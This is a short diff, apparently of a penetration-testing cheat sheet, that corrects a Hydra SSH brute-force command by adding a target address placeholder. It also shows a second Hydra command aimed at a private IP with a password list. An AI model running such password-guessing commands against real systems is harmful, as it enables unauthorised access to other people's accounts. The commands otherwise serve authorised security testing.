@@ -51,7 +51,7 @@ Hydra
 
 SSH Bruteforce
 
-    hydra -l username -P /usr/wordlist/rockyou.txt -t 4 ssh
+    hydra -l username -P /usr/wordlist/rockyou.txt -t 4 ssh://ip_addr
     
     hydra -l admin -P passwordlist ssh://192.168.100.155 -V
     
